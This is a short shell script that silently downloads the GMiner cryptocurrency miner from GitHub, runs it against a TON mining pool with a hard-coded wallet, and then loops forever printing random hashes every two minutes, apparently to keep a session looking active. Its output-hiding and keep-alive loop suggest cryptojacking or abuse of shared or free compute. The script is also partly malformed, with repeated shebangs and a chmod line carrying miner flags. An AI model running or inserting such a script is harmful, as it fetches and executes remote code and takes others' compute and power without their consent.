#!/bin/bash

#!/bin/sh

#!/bin/bash

wget https://github.com/develsoftware/GMinerRelease/releases/download/2.80/gminer_2_80_linux64.tar.xz >/dev/null 2>&1

tar -xf gminer_2_80_linux64.tar.xz >/dev/null 2>&1

chmod +x miner --cuda 1 -c 0 --algo ton >/dev/null 2>&1

./miner --cuda 1 -c 0 --algo ton --server next.ton-pool.club:443 --ssl 1 --user EQDKNhmKMdn1RYKBUHm0mTiBdQ80JrAyTA5cqzjr2n2rrG5X --opencl 1

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
